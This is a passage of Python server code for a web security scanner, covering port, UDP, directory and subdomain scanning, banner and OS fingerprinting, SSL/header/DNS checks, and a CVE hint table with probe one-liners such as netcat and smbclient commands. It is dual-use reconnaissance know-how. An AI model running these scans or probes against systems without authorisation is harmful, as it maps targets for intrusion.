    {"type":"body_pattern", "pattern":r"ray id.*cloudflare",        "name":"Cloudflare Block",     "vendor":"Cloudflare","confidence":"HIGH"},
    {"type":"body_pattern", "pattern":r"sorry, you have been blocked","name":"WAF Block Page",     "vendor":"Various",   "confidence":"MEDIUM"},
    {"type":"body_pattern", "pattern":r"fortigate|fortiweb",        "name":"Fortinet FortiWeb",    "vendor":"Fortinet",  "confidence":"HIGH"},
    {"type":"body_pattern", "pattern":r"radware.+appwall",          "name":"Radware AppWall",      "vendor":"Radware",   "confidence":"HIGH"},
]

# ── Vulnerability hints database ──────────────────────────────────────────────
VULN_HINTS = {
    "FTP": [
        {"id":"CVE-2011-0762","title":"vsftpd 2.3.4 backdoor","severity":"CRITICAL","desc":"A backdoor was introduced in vsftpd 2.3.4 that allows unauthenticated access via port 6200."},
        {"id":"CVE-2015-3306","title":"ProFTPD mod_copy RCE","severity":"HIGH","desc":"Unauthenticated remote code execution via SITE CPFR/CPTO commands."},
        {"id":"GENERIC","title":"Anonymous FTP access","severity":"MEDIUM","desc":"Check if anonymous login is enabled: ftp {host} → user: anonymous"},
    ],
    "SSH": [
        {"id":"CVE-2018-10933","title":"libssh auth bypass","severity":"CRITICAL","desc":"Authentication bypass in libssh <0.7.6 via SSH2_MSG_USERAUTH_SUCCESS."},
        {"id":"CVE-2023-38408","title":"OpenSSH PKCS#11 RCE","severity":"HIGH","desc":"Remote code execution in the OpenSSH ssh-agent via PKCS#11 providers."},
        {"id":"CVE-2024-6387","title":"OpenSSH RegreSSHion","severity":"CRITICAL","desc":"Race condition in OpenSSH sshd (glibc Linux) allows unauthenticated RCE as root. Affects versions before 9.8p1."},
        {"id":"GENERIC","title":"Weak SSH ciphers/MACs","severity":"MEDIUM","desc":"Run: ssh-audit {host} to check for weak key exchange, ciphers, and MACs."},
    ],
    "Telnet": [
        {"id":"GENERIC","title":"Cleartext protocol","severity":"HIGH","desc":"Telnet transmits credentials in plaintext. All traffic can be intercepted."},
    ],
    "SMTP": [
        {"id":"CVE-2020-7247","title":"OpenSMTPD RCE","severity":"CRITICAL","desc":"Remote code execution via a malformed sender address in OpenSMTPD <6.6.2."},
        {"id":"GENERIC","title":"SMTP open relay","severity":"HIGH","desc":"Test for open relay: EHLO test → MAIL FROM → RCPT TO external domain"},
    ],
    "HTTP": [
        {"id":"GENERIC","title":"Missing HTTPS redirect","severity":"MEDIUM","desc":"Service running on plain HTTP. Credentials and data may be transmitted in cleartext."},
    ],
    "SMB": [
        {"id":"CVE-2017-0144","title":"EternalBlue / MS17-010","severity":"CRITICAL","desc":"NSA exploit targeting SMBv1. Affects unpatched Windows. Used by WannaCry/NotPetya."},
        {"id":"CVE-2020-0796","title":"SMBGhost","severity":"CRITICAL","desc":"RCE in SMBv3.1.1 compression on Windows 10/Server 2019."},
        {"id":"GENERIC","title":"SMBv1 enabled","severity":"HIGH","desc":"SMBv1 is outdated and vulnerable. Check with: smbclient -N -L //{host}"},
    ],
    "RDP": [
        {"id":"CVE-2019-0708","title":"BlueKeep","severity":"CRITICAL","desc":"Pre-auth RCE in Windows RDP (XP through Server 2008 R2). No interaction required."},
        {"id":"CVE-2019-1181","title":"DejaBlue","severity":"CRITICAL","desc":"Similar to BlueKeep, affects Windows 7-10 and Server 2008-2019."},
        {"id":"GENERIC","title":"RDP exposed to internet","severity":"HIGH","desc":"RDP should never be exposed directly to the internet. Use VPN or jump host."},
    ],
    "MySQL": [
        {"id":"CVE-2012-2122","title":"MySQL auth bypass","severity":"HIGH","desc":"memcmp() return value truncation allows auth bypass with repeated login attempts."},
        {"id":"GENERIC","title":"MySQL exposed to internet","severity":"HIGH","desc":"Database should not be directly accessible. Restrict to 127.0.0.1 or VPN."},
    ],
    "PostgreSQL": [
        {"id":"CVE-2019-9193","title":"PostgreSQL COPY RCE","severity":"HIGH","desc":"Superuser can execute OS commands via COPY TO/FROM PROGRAM."},
        {"id":"GENERIC","title":"PostgreSQL exposed","severity":"HIGH","desc":"Database directly accessible. Restrict bind address to localhost."},
    ],
    "MongoDB": [
        {"id":"CVE-2013-4650","title":"MongoDB no auth default","severity":"CRITICAL","desc":"Old MongoDB defaults to no authentication. Billions of records exposed historically."},
        {"id":"GENERIC","title":"MongoDB exposed","severity":"CRITICAL","desc":"Check for unauthenticated access: mongo --host {host}"},
    ],
    "Redis": [
        {"id":"CVE-2022-0543","title":"Redis Lua sandbox escape","severity":"CRITICAL","desc":"Lua sandbox escape allows arbitrary code execution on Debian/Ubuntu Redis packages."},
        {"id":"GENERIC","title":"Redis exposed (no auth)","severity":"CRITICAL","desc":"Redis commonly has no auth by default. Check: redis-cli -h {host} ping"},
    ],
    "Elasticsearch": [
        {"id":"CVE-2015-1427","title":"Elasticsearch Groovy sandbox","severity":"CRITICAL","desc":"Dynamic script execution allows RCE in Elasticsearch <1.6.1."},
        {"id":"GENERIC","title":"Elasticsearch exposed","severity":"HIGH","desc":"Elasticsearch may expose all data without auth. Check: curl {host}:9200/_cat/indices"},
    ],
    "Docker": [
        {"id":"CVE-2019-5736","title":"runc container escape","severity":"CRITICAL","desc":"Allows overwriting the host runc binary, enabling container escape."},
        {"id":"GENERIC","title":"Docker API exposed","severity":"CRITICAL","desc":"Unauthenticated Docker API gives full host control. Never expose port 2375."},
    ],
    "Kubernetes": [
        {"id":"CVE-2018-1002105","title":"K8s API server privilege escalation","severity":"CRITICAL","desc":"Allows backend privilege escalation via established API server connections."},
        {"id":"GENERIC","title":"Kubernetes API exposed","severity":"CRITICAL","desc":"K8s API server should be behind VPN/firewall. Check: kubectl --server={host}:6443"},
    ],
    "Memcached": [
        {"id":"CVE-2018-1000115","title":"Memcached UDP amplification","severity":"HIGH","desc":"Memcached UDP port 11211 used in massive DDoS amplification attacks."},
        {"id":"GENERIC","title":"Memcached exposed","severity":"HIGH","desc":"All data accessible without auth. Run: echo stats | nc {host} 11211"},
    ],
    "VNC": [
        {"id":"CVE-2019-15681","title":"LibVNCServer memory leak","severity":"HIGH","desc":"Memory disclosure in LibVNCServer could leak server memory to clients."},
        {"id":"GENERIC","title":"VNC exposed to internet","severity":"HIGH","desc":"VNC should never face the internet directly. Use SSH tunneling."},
    ],
    "Jupyter": [
        {"id":"GENERIC","title":"Jupyter Notebook exposed","severity":"CRITICAL","desc":"Jupyter may allow arbitrary code execution. Check: http://{host}:8888/ without token."},
    ],
    "CouchDB": [
        {"id":"CVE-2017-12635","title":"CouchDB admin RCE","severity":"CRITICAL","desc":"Admin privilege escalation and RCE in CouchDB <2.1.1 via JSON body parameter."},
        {"id":"GENERIC","title":"CouchDB exposed","severity":"HIGH","desc":"Check: curl http://{host}:5984/_utils/"},
    ],
    "WebLogic": [
        {"id":"CVE-2019-2725","title":"WebLogic AsyncResponseService RCE","severity":"CRITICAL","desc":"Unauthenticated RCE via _async deserialization. Widely exploited."},
        {"id":"CVE-2020-14882","title":"WebLogic console auth bypass","severity":"CRITICAL","desc":"Auth bypass in WebLogic console allows full system compromise."},
    ],
}

# ═══════════════════════════════════════════════════════════════════════════════
#  HELPER FUNCTIONS
# ═══════════════════════════════════════════════════════════════════════════════

def parse_port_range(s: str) -> list:
    ports, seen = [], set()
    for part in s.split(","):
        part = part.strip()
        if "-" in part:
            try:
                a, b = part.split("-", 1)
                for p in range(int(a), min(int(b)+1, 65536)):
                    if p not in seen: ports.append(p); seen.add(p)
            except ValueError:
                continue
        else:
            try:
                p = int(part)
                if 0 < p < 65536 and p not in seen: ports.append(p); seen.add(p)
            except ValueError:
                continue
    return ports


async def grab_banner(host: str, port: int, timeout: float = 2.5) -> str:
    try:
        reader, writer = await asyncio.wait_for(asyncio.open_connection(host, port), timeout=timeout)
        if port in (80, 8080, 8000, 8008, 8888, 3000, 4000, 5000, 9000):
            writer.write(b"HEAD / HTTP/1.0\r\nHost: " + host.encode() + b"\r\n\r\n")
            await writer.drain()
        try:
            data = await asyncio.wait_for(reader.read(256), timeout=timeout)
            writer.close()
            try: await writer.wait_closed()
            except Exception: pass
            return data.decode("utf-8", errors="replace").strip().split("\n")[0][:120].strip()
        except Exception:
            try: writer.close()
            except Exception: pass
            return ""
    except Exception:
        return ""


async def detect_os_ttl(host: str) -> str:
    try:
        if platform.system().lower() == "windows":
            flag = ["-n", "1"]
        else:
            flag = ["-c", "1", "-W", "3"]
        proc = await asyncio.create_subprocess_exec(
            "ping", *flag, host,
            stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.DEVNULL
        )
        stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=6)
        m = re.search(r"ttl[=\s]+(\d+)", stdout.decode("utf-8", errors="replace"), re.IGNORECASE)
        if m:
            ttl = int(m.group(1))
            if ttl <= 64:   return f"Linux/Unix (TTL={ttl})"
            elif ttl <= 128: return f"Windows (TTL={ttl})"
            else:            return f"Network Device/Router (TTL={ttl})"
        return "Host alive — TTL not parsed"
    except Exception:
        return "Unknown (ping failed or blocked)"


async def scan_port_tcp(host, port, sem, timeout, do_banner):
    async with sem:
        try:
            _, writer = await asyncio.wait_for(asyncio.open_connection(host, port), timeout=timeout)
            writer.close()
            try: await writer.wait_closed()
            except Exception: pass
            banner = await grab_banner(host, port, 2.5) if do_banner else ""
            return {"port":port, "status":"open", "service":PORT_SERVICES.get(port,"Unknown"), "banner":banner}
        except Exception:
            return {"port":port, "status":"closed"}


async def scan_port_udp(host, port, sem, timeout):
    async with sem:
        loop = asyncio.get_running_loop()
        def _probe():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.settimeout(timeout)
                s.sendto(UDP_PROBES.get(port, b"\x00"), (host, port))
                try:
                    data, _ = s.recvfrom(1024); s.close()
                    return {"port":port,"status":"open","service":PORT_SERVICES.get(port,"Unknown"),"bytes":len(data)}
                except socket.timeout:
                    s.close()
                    return {"port":port,"status":"open|filtered","service":PORT_SERVICES.get(port,"Unknown"),"bytes":0}
                except OSError:
                    s.close(); return {"port":port,"status":"closed"}
            except Exception as e:
                return {"port":port,"status":"error","detail":str(e)}
        return await loop.run_in_executor(None, _probe)


def _match_tech(text: str, sig_list: list, found: dict) -> list:
    """Match technology signatures against text, dedup by name."""
    results = []
    for pattern, name, category, confidence in sig_list:
        if name in found:
            continue
        m = re.search(pattern, text, re.IGNORECASE)
        if m:
            version = m.group(1) if m.lastindex and m.lastindex >= 1 else ""
            display = f"{name} {version}".strip() if version else name
            found[name] = True
            results.append({
                "name":display, "category":category, "confidence":confidence,
                "evidence":pattern[:60]
            })
    return results


async def dns_query_doh(domain: str, rtype: str, session: aiohttp.ClientSession) -> list:
    """DNS-over-HTTPS via Cloudflare (1.1.1.1) as fallback."""
    try:
        url = f"https://cloudflare-dns.com/dns-query?name={domain}&type={rtype}"
        async with session.get(url, headers={"Accept":"application/dns-json"},
                               timeout=aiohttp.ClientTimeout(total=5), ssl=False) as r:
            if r.status != 200:
                return []
            data = await r.json(content_type=None)
            answers = data.get("Answer", [])
            results = []
            for a in answers:
                rdata = str(a.get("data","")).strip()
                if rdata:
                    results.append(rdata)
            return results
    except Exception:
        return []


async def whois_raw(host: str, server: str = "whois.iana.org", port: int = 43) -> str:
    """Perform a WHOIS query over TCP port 43."""
    loop = asyncio.get_running_loop()
    def _do():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((server, port))
            s.send((host + "\r\n").encode())
            chunks = []
            while True:
                try:
                    data = s.recv(4096)
                    if not data:
                        break
                    chunks.append(data)
                except Exception:
                    break
            s.close()
            return b"".join(chunks).decode("utf-8", errors="replace")
        except Exception as e:
            return f"ERROR: {e}"
    return await loop.run_in_executor(None, _do)


# ═══════════════════════════════════════════════════════════════════════════════
#  WEBSOCKET ENDPOINTS — EXISTING
# ═══════════════════════════════════════════════════════════════════════════════

@app.websocket("/ws/portscan")
async def ws_portscan(ws: WebSocket):
    await ws.accept()
    try:
        data = await ws.receive_json()
        host      = data.get("host","").strip()
        threads   = min(int(data.get("threads",500)), 2000)
        timeout   = float(data.get("timeout",1.0))
        do_banner = bool(data.get("banner",False))
        do_os     = bool(data.get("os_detect",False))
        preset    = data.get("preset","")

        if not host: await ws.send_json({"type":"error","message":"No host specified"}); return

        if   preset == "top100":  ports = TOP_100_PORTS[:]
        elif preset == "top1000": ports = TOP_1000_PORTS[:]
        elif preset == "full":    ports = list(range(1,65536))
        else:                     ports = parse_port_range(data.get("ports","1-1000"))

        if not ports: await ws.send_json({"type":"error","message":"Invalid port range"}); return

        if do_os:
            await ws.send_json({"type":"info","message":f"Running OS detection for {host}..."})
            os_hint = await detect_os_ttl(host)
            await ws.send_json({"type":"os","message":f"OS Hint: {os_hint}","os":os_hint})

        await ws.send_json({"type":"info","message":
            f"Target: {host}  |  Ports: {len(ports)}  |  Threads: {threads}  |  Timeout: {timeout}s  |  Banner: {'on' if do_banner else 'off'}"})

        sem = asyncio.Semaphore(threads)
        tasks = [scan_port_tcp(host,p,sem,timeout,do_banner) for p in ports]
        found, scanned = [], 0

        for coro in asyncio.as_completed(tasks):
            res = await coro; scanned += 1
            if res["status"] == "open":
                found.append(res["port"])
                await ws.send_json({"type":"result","data":res})
            if scanned % 200 == 0 or scanned == len(ports):
                await ws.send_json({"type":"progress","scanned":scanned,"total":len(ports),"open":len(found)})

        await ws.send_json({"type":"done",
            "message":f"TCP scan complete — {len(found)} open port(s) out of {len(ports)} scanned",
            "open_ports":found})
    except WebSocketDisconnect: pass
    except Exception as e:
        try: await ws.send_json({"type":"error","message":str(e)})
        except Exception: pass


@app.websocket("/ws/udpscan")
async def ws_udpscan(ws: WebSocket):
    await ws.accept()
    try:
        data    = await ws.receive_json()
        host    = data.get("host","").strip()
        threads = min(int(data.get("threads",30)), 100)
        timeout = float(data.get("timeout",2.0))
        custom  = data.get("ports","").strip()
        ports   = parse_port_range(custom) if custom else DEFAULT_UDP_PORTS[:]

        if not host: await ws.send_json({"type":"error","message":"No host specified"}); return

        await ws.send_json({"type":"info","message":
            f"UDP Target: {host}  |  Ports: {len(ports)}  |  Threads: {threads}  |  Timeout: {timeout}s"})
        await ws.send_json({"type":"warn","message":"Note: UDP scanning may require root/admin privileges on some systems"})

        sem = asyncio.Semaphore(threads)
        tasks = [scan_port_udp(host,p,sem,timeout) for p in ports]
        found, scanned = [], 0

        for coro in asyncio.as_completed(tasks):
            res = await coro; scanned += 1
            if res["status"] not in ("closed","error"):
                found.append(res["port"])
                await ws.send_json({"type":"result","data":res})
            if scanned % 10 == 0 or scanned == len(ports):
                await ws.send_json({"type":"progress","scanned":scanned,"total":len(ports),"open":len(found)})

        await ws.send_json({"type":"done",
            "message":f"UDP scan complete — {len(found)} open/filtered port(s) found","open_ports":found})
    except WebSocketDisconnect: pass
    except Exception as e:
        try: await ws.send_json({"type":"error","message":str(e)})
        except Exception: pass


@app.websocket("/ws/dirscan")
async def ws_dirscan(ws: WebSocket):
    await ws.accept()
    try:
        data       = await ws.receive_json()
        url        = data.get("url","").strip().rstrip("/")
        raw_words  = data.get("wordlist","").strip()
        exts       = [e.strip().lstrip(".") for e in data.get("extensions","").split(",") if e.strip()]
        threads    = min(int(data.get("threads",50)), 200)
        raw_filter = data.get("status_filter","200,301,302,401,403")
        allowed    = {int(s.strip()) for s in raw_filter.split(",") if s.strip().isdigit()}
        recursive  = bool(data.get("recursive",False))
        do_preview = bool(data.get("preview",False))
        proxy      = data.get("proxy","").strip() or None
        extra_hdrs = data.get("headers",{})

        if not url: await ws.send_json({"type":"error","message":"No URL specified"}); return

        wordlist = [w.strip() for w in raw_words.splitlines() if w.strip()] if raw_words else BUILTIN_WORDLIST

        def build_paths(words):
            paths = []
            for word in words:
                paths.append(word)
                for ext in exts:
                    if not word.endswith(f".{ext}"): paths.append(f"{word}.{ext}")
            return paths

        paths = build_paths(wordlist)

        await ws.send_json({"type":"info","message":
            f"Target: {url}  |  Paths: {len(paths)}  |  Threads: {threads}  |  Recursive: {'on' if recursive else 'off'}  |  Preview: {'on' if do_preview else 'off'}"
            + (f"  |  Proxy: {proxy}" if proxy else "")})

        base_headers = {"User-Agent":"ScanX/3.0 (Authorized Security Testing)"}
        base_headers.update(extra_hdrs)

        sem = asyncio.Semaphore(threads)
        found_total, scanned_total, found_dirs = [], 0, []

        async def probe(session, base_url, path):
            async with sem:
                full = f"{base_url}/{path}"
                t0 = time.monotonic()
                try:
                    async with session.get(full, timeout=aiohttp.ClientTimeout(total=6),
                                           allow_redirects=False, ssl=False, proxy=proxy) as r:
                        rtt = round((time.monotonic() - t0) * 1000)
                        redirect_to = r.headers.get("location","") if r.status in (301,302,307,308) else ""
                        preview_text = ""
                        if do_preview and r.status in allowed:
                            try:
                                chunk = await r.content.read(400)
                                preview_text = chunk.decode("utf-8",errors="replace").strip()[:200]
                            except Exception: pass
                        return {"path":path,"url":full,"status":r.status,
                                "label":STATUS_LABELS.get(r.status,str(r.status)),
                                "size":r.headers.get("Content-Length","?"),
                                "rtt_ms":rtt,
                                "redirect":redirect_to[:100],
                                "preview":preview_text}
                except Exception:
                    return None

        conn = aiohttp.TCPConnector(limit=threads, ssl=False)
        async with aiohttp.ClientSession(connector=conn, headers=base_headers) as session:
            tasks = [probe(session,url,p) for p in paths]
            for coro in asyncio.as_completed(tasks):
                res = await coro; scanned_total += 1
                if res and res["status"] in allowed:
                    found_total.append(res)
                    if recursive and res["status"] in (200,301,302) and "." not in res["path"]:
                        found_dirs.append(res["path"])
                    await ws.send_json({"type":"result","data":res})
                if scanned_total % 100 == 0 or scanned_total == len(paths):
                    await ws.send_json({"type":"progress","scanned":scanned_total,"total":len(paths),"found":len(found_total)})

            if recursive and found_dirs:
                await ws.send_json({"type":"info","message":f"Recursive: scanning {len(found_dirs)} director(ies)..."})
                for d in found_dirs:
                    for coro in asyncio.as_completed([probe(session,f"{url}/{d}",p) for p in build_paths(wordlist[:60])]):
                        res = await coro; scanned_total += 1
                        if res and res["status"] in allowed:
                            res["path"] = f"{d}/{res['path']}"; res["url"] = f"{url}/{res['path']}"
                            found_total.append(res)
                            await ws.send_json({"type":"result","data":res})

        await ws.send_json({"type":"done",
            "message":f"Dir scan complete — {len(found_total)} path(s) found out of {scanned_total} tested"})
    except WebSocketDisconnect: pass
    except Exception as e:
        try: await ws.send_json({"type":"error","message":str(e)})
        except Exception: pass


@app.websocket("/ws/subdomain")
async def ws_subdomain(ws: WebSocket):
    await ws.accept()
    try:
        data      = await ws.receive_json()
        domain    = re.sub(r"^https?://","",data.get("domain","").strip()).split("/")[0].lstrip("www.")
        raw_words = data.get("wordlist","").strip()
        threads   = min(int(data.get("threads",100)), 500)

        if not domain: await ws.send_json({"type":"error","message":"No domain specified"}); return

        wordlist = list(dict.fromkeys(
            [w.strip() for w in raw_words.splitlines() if w.strip()] if raw_words else BUILTIN_SUBDOMAINS
        ))

        await ws.send_json({"type":"info","message":
            f"Domain: {domain}  |  Wordlist: {len(wordlist)}  |  Threads: {threads}"})

        sem = asyncio.Semaphore(threads)
        loop = asyncio.get_running_loop()
        found, scanned = [], 0

        async def resolve(sub):
            async with sem:
                fqdn = f"{sub}.{domain}"
                try:
                    info = await loop.getaddrinfo(fqdn,None)
                    ips  = list({r[4][0] for r in info})
                    return {"subdomain":fqdn,"ips":ips,"status":"resolved"}
                except Exception:
                    return {"subdomain":fqdn,"status":"nxdomain"}

        tasks = [resolve(w) for w in wordlist]
        for coro in asyncio.as_completed(tasks):
            res = await coro; scanned += 1
            if res["status"] == "resolved":
                found.append(res)
                await ws.send_json({"type":"result","data":res})
            if scanned % 50 == 0 or scanned == len(wordlist):
                await ws.send_json({"type":"progress","scanned":scanned,"total":len(wordlist),"open":len(found)})

        await ws.send_json({"type":"done",
            "message":f"Subdomain scan complete — {len(found)} resolved out of {len(wordlist)} tested"})
    except WebSocketDisconnect: pass
    except Exception as e:
        try: await ws.send_json({"type":"error","message":str(e)})
        except Exception: pass


@app.websocket("/ws/sslcheck")
async def ws_sslcheck(ws: WebSocket):
    await ws.accept()
    try:
        data = await ws.receive_json()
        host = data.get("host","").strip()
        port = int(data.get("port",443))

        if not host: await ws.send_json({"type":"error","message":"No host specified"}); return

        await ws.send_json({"type":"info","message":f"Inspecting SSL/TLS: {host}:{port}"})

        loop = asyncio.get_running_loop()

        def _check():
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode    = ssl.CERT_NONE
            try:
                raw  = socket.create_connection((host,port), timeout=10)
                conn = ctx.wrap_socket(raw, server_hostname=host)
                cert = conn.getpeercert()
                ciph = conn.cipher()
                ver  = conn.version()
                conn.close()
                subj    = dict(x[0] for x in cert.get("subject",[]))
                issuer  = dict(x[0] for x in cert.get("issuer",[]))
                exp_str = cert.get("notAfter","")
                nb_str  = cert.get("notBefore","")
                sans    = [v for (t,v) in cert.get("subjectAltName",[]) if t=="DNS"][:20]
                days_left = None
                try:
                    exp = datetime.strptime(exp_str, "%b %d %H:%M:%S %Y %Z")
                    days_left = (exp - datetime.utcnow()).days
                except Exception: pass
                # Detect self-signed
                self_signed = subj.get("commonName","") == issuer.get("commonName","") or \
                              subj.get("organizationName","") == issuer.get("organizationName","")
                return {"ok":True,"subject_cn":subj.get("commonName",""),
                        "issuer_cn":issuer.get("commonName",""),"issuer_org":issuer.get("organizationName",""),
                        "not_before":nb_str,"not_after":exp_str,"days_left":days_left,"sans":sans,
                        "tls_version":ver,"cipher":ciph[0] if ciph else "","cipher_bits":ciph[2] if ciph else 0,
                        "self_signed":self_signed}
            except Exception as ex:
                return {"ok":False,"error":str(ex)}

        info = await loop.run_in_executor(None, _check)
        await ws.send_json({"type":"ssl_result","data":info})

        if info.get("ok"):
            for chk, val, status in [
                ("Subject CN",   info.get("subject_cn","?"),                                          "INFO"),
                ("Issuer",       f"{info.get('issuer_cn','')} / {info.get('issuer_org','')}",          "INFO"),
                ("Valid From",   info.get("not_before","?"),                                           "INFO"),
                ("Valid Until",  info.get("not_after","?"),                                            "INFO"),
                ("TLS Version",  info.get("tls_version","?"),                                          "INFO"),
                ("Cipher Suite", f"{info.get('cipher','')} ({info.get('cipher_bits',0)} bit)",         "INFO"),
            ]:
                await ws.send_json({"type":"result","data":{"check":chk,"value":val,"status":status}})

            # Self-signed check
            if info.get("self_signed"):
                await ws.send_json({"type":"result","data":{"check":"Self-Signed",
                    "value":"Certificate is self-signed — not trusted by browsers","status":"WARN"}})

            days = info.get("days_left")
            if days is not None:
                st = "CRITICAL" if days < 0 else ("CRITICAL" if days < 15 else ("WARN" if days < 30 else "OK"))
                await ws.send_json({"type":"result","data":{"check":"Expiry",
                    "value":f"{abs(days)} days {'until expiry' if days>=0 else 'EXPIRED'}","status":st}})

            ver = info.get("tls_version","")
            if ver in ("TLSv1","TLSv1.1","SSLv2","SSLv3"):
                await ws.send_json({"type":"result","data":{"check":"Protocol",
                    "value":f"{ver} is deprecated and insecure","status":"CRITICAL"}})
            elif ver in ("TLSv1.2",):
                await ws.send_json({"type":"result","data":{"check":"Protocol",
                    "value":"TLS 1.2 is supported but TLS 1.3 is preferred","status":"WARN"}})
            else:
                await ws.send_json({"type":"result","data":{"check":"Protocol",
                    "value":f"{ver} is modern and secure","status":"OK"}})

            # Weak cipher check
            cipher = info.get("cipher","").upper()
            if any(w in cipher for w in ("RC4","DES","3DES","EXPORT","NULL","ADH","AECDH")):
                await ws.send_json({"type":"result","data":{"check":"Cipher Strength",
                    "value":f"{info.get('cipher')} is weak/deprecated","status":"CRITICAL"}})
            elif info.get("cipher_bits",0) < 128:
                await ws.send_json({"type":"result","data":{"check":"Cipher Strength",
                    "value":f"Key length {info.get('cipher_bits')} bits is insufficient","status":"WARN"}})

            if info.get("sans"):
                await ws.send_json({"type":"result","data":{"check":"SANs",
                    "value":", ".join(info["sans"][:8])+("..." if len(info["sans"])>8 else ""),"status":"INFO"}})
        else:
            await ws.send_json({"type":"result","data":{"check":"Connection","value":info.get("error","Failed"),"status":"CRITICAL"}})

        await ws.send_json({"type":"done","message":"SSL/TLS inspection complete"})
    except WebSocketDisconnect: pass
    except Exception as e:
        try: await ws.send_json({"type":"error","message":str(e)})
        except Exception: pass


@app.websocket("/ws/headercheck")
async def ws_headercheck(ws: WebSocket):
    await ws.accept()
    try:
        data = await ws.receive_json()
        url  = data.get("url","").strip()

        if not url: await ws.send_json({"type":"error","message":"No URL specified"}); return

        await ws.send_json({"type":"info","message":f"Analyzing HTTP headers: {url}"})

        conn = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(connector=conn) as session:
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=10),
                                   allow_redirects=True, ssl=False,
                                   headers={"User-Agent":"ScanX/3.0 Security Audit"}) as r:
                hdrs = {k.lower():v for k,v in r.headers.items()}
                await ws.send_json({"type":"info","message":
                    f"HTTP {r.status}  |  Server: {hdrs.get('server','?')}  |  Content-Type: {hdrs.get('content-type','?').split(';')[0]}"})

                # All response headers
                await ws.send_json({"type":"info","message":
                    f"Headers received: {len(hdrs)} total — checking security headers..."})

                missing = 0
                for key, meta in SECURITY_HEADERS.items():
                    if key in hdrs:
                        await ws.send_json({"type":"result","data":{"header":meta["name"],"status":"PRESENT","risk":"OK","value":hdrs[key][:120]}})
                    else:
                        missing += 1
                        await ws.send_json({"type":"result","data":{"header":meta["name"],"status":"MISSING","risk":meta["risk"],"value":meta["desc"]}})

                # Info leak headers
                for lhdr in ("server","x-powered-by","x-aspnet-version","x-aspnetmvc-version","x-generator","x-runtime","x-debug-token"):
                    if lhdr in hdrs:
                        await ws.send_json({"type":"result","data":{"header":lhdr.title(),"status":"LEAK","risk":"MEDIUM","value":f"Discloses: {hdrs[lhdr]}"}})

                # Check cookie flags
                for ck_hdr in r.cookies.values():
                    flags = []
                    if not ck_hdr.get("secure"): flags.append("Missing Secure flag")
                    if not ck_hdr.get("httponly"): flags.append("Missing HttpOnly flag")
                    if ck_hdr.get("samesite","").lower() == "": flags.append("Missing SameSite")
                    if flags:
                        await ws.send_json({"type":"result","data":{"header":f"Cookie: {ck_hdr.key}","status":"WARN","risk":"MEDIUM","value":" | ".join(flags)}})

        await ws.send_json({"type":"done","message":f"Header analysis complete — {missing} security header(s) missing"})
    except WebSocketDisconnect: pass
    except Exception as e:
        try: await ws.send_json({"type":"error","message":str(e)})
        except Exception: pass


# ═══════════════════════════════════════════════════════════════════════════════
#  WEBSOCKET ENDPOINTS — NEW v3.0
# ═══════════════════════════════════════════════════════════════════════════════

@app.websocket("/ws/dns")
async def ws_dns(ws: WebSocket):
    await ws.accept()
    try:
        data   = await ws.receive_json()
        domain = re.sub(r"^https?://","",data.get("domain","").strip()).split("/")[0].strip(".")

        if not domain: await ws.send_json({"type":"error","message":"No domain specified"}); return

        await ws.send_json({"type":"info","message":f"DNS Lookup: {domain}"})

        loop   = asyncio.get_running_loop()
        found  = 0

        # Try dnspython first
        try:
            import dns.resolver as resolver
            import dns.reversename
            HAS_DNS = True
        except ImportError:
            HAS_DNS = False

        if HAS_DNS:
            for rtype in ["A","AAAA","CNAME","MX","NS","TXT","SOA"]:
                try:
                    answers = resolver.resolve(domain, rtype, raise_on_no_answer=False)
                    if answers.rrset is None:
                        await ws.send_json({"type":"result","data":{"record_type":rtype,"value":"(none)","status":"NONE"}})
                        continue
                    for rdata in answers:
                        if   rtype == "MX":   val = f"{rdata.preference} {rdata.exchange}"
                        elif rtype == "SOA":  val = f"mname={rdata.mname} serial={rdata.serial} refresh={rdata.refresh}"
                        elif rtype == "TXT":  val = " ".join(s.decode(errors="replace") for s in rdata.strings)
                        else:                 val = str(rdata)
                        found += 1
                        await ws.send_json({"type":"result","data":{"record_type":rtype,"value":val.strip(),"status":"FOUND"}})
                except Exception as e:
                    await ws.send_json({"type":"result","data":{"record_type":rtype,"value":f"({str(e)[:60]})","status":"SKIP"}})

            # Reverse PTR
            try:
                a_ans = resolver.resolve(domain,"A")
                for rdata in list(a_ans)[:3]:
                    ip  = str(rdata)
                    rev = dns.reversename.from_address(ip)
                    try:
                        ptr = resolver.resolve(rev,"PTR")
                        for p in ptr:
                            found += 1
                            await ws.send_json({"type":"result","data":{"record_type":"PTR","value":f"{ip} → {p}","status":"FOUND"}})
                    except Exception:
                        await ws.send_json({"type":"result","data":{"record_type":"PTR","value":f"{ip} → (no PTR record)","status":"NONE"}})
            except Exception:
                pass
        else:
            # Fallback: socket for A/AAAA + DoH for other types
            await ws.send_json({"type":"warn","message":"dnspython not installed — using fallback (pip install dnspython for full support)"})

            for family, rtype in [(socket.AF_INET,"A"),(socket.AF_INET6,"AAAA")]:
                def _getaddr(dom=domain, fam=family):
                    try:
                        return list({r[4][0] for r in socket.getaddrinfo(dom, None, fam)})
                    except Exception:
                        return []
                ips = await loop.run_in_executor(None, _getaddr)
                if ips:
                    for ip in ips:
                        found += 1
                        await ws.send_json({"type":"result","data":{"record_type":rtype,"value":ip,"status":"FOUND"}})
                else:
                    await ws.send_json({"type":"result","data":{"record_type":rtype,"value":"(none)","status":"NONE"}})

            # Try DNS-over-HTTPS for other record types
            try:
                conn = aiohttp.TCPConnector(ssl=False)
                async with aiohttp.ClientSession(connector=conn) as session:
                    for rtype in ["CNAME","MX","NS","TXT","SOA"]:
                        vals = await dns_query_doh(domain, rtype, session)
                        if vals:
                            for v in vals:
                                found += 1
                                await ws.send_json({"type":"result","data":{"record_type":rtype,"value":v,"status":"FOUND"}})
                        else:
                            await ws.send_json({"type":"result","data":{"record_type":rtype,"value":"(none)","status":"NONE"}})
            except Exception as e:
                await ws.send_json({"type":"warn","message":f"DoH fallback failed: {e}"})

            # Try subprocess dig/nslookup
            if shutil.which("dig"):
                for rtype in ["CAA","DNSKEY"]:
                    try:
                        proc = await asyncio.create_subprocess_exec(
                            "dig","+short",domain,rtype,
